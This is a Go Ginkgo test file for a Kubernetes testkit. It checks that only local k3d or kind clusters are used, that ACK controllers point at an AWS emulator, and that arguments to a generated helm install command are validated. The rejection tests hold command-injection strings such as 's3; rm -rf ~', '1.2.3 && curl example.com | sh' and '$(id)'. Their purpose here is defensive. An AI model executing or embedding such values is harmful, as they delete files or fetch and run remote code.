package testkit

import (
	"testing"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	fakediscovery "k8s.io/client-go/discovery/fake"
	"k8s.io/client-go/kubernetes/fake"
)

func TestTestkit(t *testing.T) {
	RegisterFailHandler(Fail)
	RunSpecs(t, "testkit")
}

var _ = Describe("RequireDisposableCluster", func() {
	DescribeTable("accepts a k3d or kind context whose API server is on this machine",
		func(context, server string) {
			Expect(RequireDisposableCluster(context, server)).To(Succeed())
		},
		Entry("k3d on the unspecified address", "k3d-vela-demo", "https://0.0.0.0:62520"),
		Entry("k3d from inside a container", "k3d-vela-demo", "https://host.docker.internal:62520"),
		Entry("k3d through its own load balancer container", "k3d-vela-demo", "https://k3d-vela-demo-serverlb:6443"),
		Entry("kind on loopback", "kind-kind", "https://127.0.0.1:41235"),
		Entry("kind on IPv6 loopback", "kind-kind", "https://[::1]:41235"),
		Entry("kind through its own node container", "kind-ci", "https://ci-control-plane:6443"),
		Entry("kind on localhost", "kind-kind", "https://localhost:6443"),
	)

	// The name is not proof: a real cluster behind a local-looking name is refused.
	DescribeTable("refuses everything else",
		func(context, server, reason string) {
			Expect(RequireDisposableCluster(context, server)).To(MatchError(ContainSubstring(reason)))
		},
		Entry("a kind name on an EKS endpoint", "kind-prod", "https://ABCDEF.gr7.us-west-2.eks.amazonaws.com", "not on this machine"),
		Entry("a k3d name on a private address", "k3d-prod", "https://10.20.30.40:6443", "not on this machine"),
		Entry("another kind cluster's node", "kind-kind", "https://other-control-plane:6443", "not on this machine"),
		Entry("another k3d cluster's load balancer", "k3d-a", "https://k3d-b-serverlb:6443", "not on this machine"),
		Entry("no server address", "kind-kind", "", "no usable API server address"),
		Entry("no context", "", "https://127.0.0.1:6443", "not a k3d or kind cluster"),
		Entry("a local cluster of another tool", "orbstack", "https://127.0.0.1:26443", "not a k3d or kind cluster"),
		Entry("an EKS context", "arn:aws:eks:us-west-2:123456789012:cluster/prod", "https://127.0.0.1:6443", "not a k3d or kind cluster"),
		Entry("a name that only contains k3d", "my-k3d-lookalike", "https://127.0.0.1:6443", "not a k3d or kind cluster"),
	)
})

var _ = Describe("ACK conditions", func() {
	resource := func(conditions ...map[string]any) *unstructured.Unstructured {
		list := make([]any, 0, len(conditions))
		for _, c := range conditions {
			list = append(list, c)
		}
		return &unstructured.Unstructured{Object: map[string]any{"status": map[string]any{"conditions": list}}}
	}
	condition := func(conditionType, status string) map[string]any {
		return map[string]any{"type": conditionType, "status": status}
	}

	DescribeTable("ACKReady",
		func(obj *unstructured.Unstructured, wantReady bool, wantReason string) {
			ready, reason := ACKReady(obj)
			Expect(ready).To(Equal(wantReady))
			if wantReason == "" {
				Expect(reason).To(BeEmpty())
			} else {
				Expect(reason).To(ContainSubstring(wantReason))
			}
		},
		Entry("no status yet", &unstructured.Unstructured{Object: map[string]any{}}, false, "ACK.ResourceSynced"),
		Entry("synced", resource(condition("ACK.ResourceSynced", "True")), true, ""),
		Entry("not synced", resource(condition("ACK.ResourceSynced", "False")), false, "ACK.ResourceSynced"),
		Entry("reconciling", resource(condition("ACK.ResourceSynced", "Unknown")), false, "ACK.ResourceSynced"),
		Entry("terminal false is fine", resource(condition("ACK.ResourceSynced", "True"), condition("ACK.Terminal", "False")), true, ""),
		// The controller gave up; Synced kept the value it had before.
		Entry("terminal with a stale synced", resource(condition("ACK.ResourceSynced", "True"), condition("ACK.Terminal", "True")), false, "ACK.Terminal"),
	)

	It("returns the status of one condition, or nothing when it is absent", func() {
		obj := resource(condition("ACK.ResourceSynced", "Unknown"))
		Expect(ACKCondition(obj, "ACK.ResourceSynced")).To(Equal("Unknown"))
		Expect(ACKCondition(obj, "ACK.Terminal")).To(BeEmpty())
	})
})

var _ = Describe("RequireACKOnEmulator", func() {
	const image = "public.ecr.aws/aws-controllers-k8s/dynamodb-controller:1.16.0"

	controller := func(image, endpoint string, available int32) *appsv1.Deployment {
		container := corev1.Container{Name: "controller", Image: image}
		if endpoint != "" {
			container.Env = []corev1.EnvVar{{Name: "AWS_ENDPOINT_URL", Value: endpoint}}
		}
		return &appsv1.Deployment{
			ObjectMeta: metav1.ObjectMeta{Name: "ack-dynamodb", Namespace: "ack-system"},
			Spec:       appsv1.DeploymentSpec{Template: corev1.PodTemplateSpec{Spec: corev1.PodSpec{Containers: []corev1.Container{container}}}},
			Status:     appsv1.DeploymentStatus{AvailableReplicas: available},
		}
	}

	// cluster has the ACK DynamoDB API when served is true, and the given
	// controller Deployment when it is not nil.
	cluster := func(served bool, deployment *appsv1.Deployment) *Cluster {
		kube := fake.NewClientset()
		if deployment != nil {
			kube = fake.NewClientset(deployment)
		}
		if served {
			kube.Discovery().(*fakediscovery.FakeDiscovery).Resources = []*metav1.APIResourceList{{
				GroupVersion: "dynamodb.services.k8s.aws/v1alpha1",
				APIResources: []metav1.APIResource{{Name: "tables", Kind: "Table", Namespaced: true}},
			}}
		}
		return &Cluster{Kube: kube}
	}

	It("passes for a running controller pointed at the emulator", func(ctx SpecContext) {
		c := cluster(true, controller(image, AWSEmulatorEndpoint, 1))
		Expect(c.RequireACKOnEmulator(ctx, "dynamodb")).To(Succeed())
	})

	It("gives the install command when the controller is not installed", func(ctx SpecContext) {
		err := cluster(false, nil).RequireACKOnEmulator(ctx, "dynamodb")
		Expect(err).To(MatchError(And(
			ContainSubstring("is not installed"),
			ContainSubstring("aws.endpoint_url="+AWSEmulatorEndpoint),
		)))
	})

	DescribeTable("refuses a controller it must not use",
		func(ctx SpecContext, deployment *appsv1.Deployment, reason string) {
			Expect(cluster(true, deployment).RequireACKOnEmulator(ctx, "dynamodb")).To(MatchError(ContainSubstring(reason)))
		},
		// No endpoint override: this controller creates resources in AWS.
		Entry("one that talks to AWS", controller(image, "", 1), "refusing"),
		Entry("one on another endpoint", controller(image, "http://floci.floci.svc:4566", 1), "refusing"),
		Entry("one that is not running", controller(image, AWSEmulatorEndpoint, 0), "not running"),
		Entry("an API that no controller serves", controller("example.com/other:1", AWSEmulatorEndpoint, 1), "no dynamodb-controller"),
	)

	It("rejects a service name that is not plain", func(ctx SpecContext) {
		err := cluster(true, nil).RequireACKOnEmulator(ctx, "dynamodb; id")
		Expect(err).To(MatchError(ContainSubstring("not an ACK service name")))
	})
})

var _ = Describe("ACKInstallCommand", func() {
	It("installs the service's chart pointed at the emulator", func() {
		command, err := ACKInstallCommand("s3", "1.2.3")
		Expect(err).NotTo(HaveOccurred())
		Expect(command).To(And(
			ContainSubstring("oci://public.ecr.aws/aws-controllers-k8s/s3-chart --version 1.2.3"),
			ContainSubstring("aws.endpoint_url="+AWSEmulatorEndpoint),
			ContainSubstring("aws.allow_unsafe_aws_endpoint_urls=true"),
		))
	})

	// Both arguments end up in a command a person pastes into a shell.
	DescribeTable("rejects arguments that are not a plain name and version",
		func(service, version string) {
			_, err := ACKInstallCommand(service, version)
			Expect(err).To(HaveOccurred())
		},
		Entry("a command after the service", "s3; rm -rf ~", "1.2.3"),
		Entry("a command after the version", "s3", "1.2.3 && curl example.com | sh"),
		Entry("an upper-case service", "S3", "1.2.3"),
		Entry("no service", "", "1.2.3"),
		Entry("no version", "s3", ""),
		Entry("a substitution as the version", "s3", "$(id)"),
	)
})

var _ = Describe("EnsureAWSEmulator", func() {
	It("leaves a complete emulator alone", func(ctx SpecContext) {
		deployment := &appsv1.Deployment{
			ObjectMeta: metav1.ObjectMeta{Name: AWSEmulatorName, Namespace: AWSEmulatorNamespace},
			Status:     appsv1.DeploymentStatus{AvailableReplicas: 1},
		}
		service := &corev1.Service{ObjectMeta: metav1.ObjectMeta{Name: AWSEmulatorName, Namespace: AWSEmulatorNamespace}}
		// No dynamic client and no mapper: an apply would panic, so success
		// means the running emulator was not touched.
		c := &Cluster{Kube: fake.NewClientset(deployment, service)}

		Expect(c.EnsureAWSEmulator(ctx, "0.0.0")).To(Succeed())
	})
})
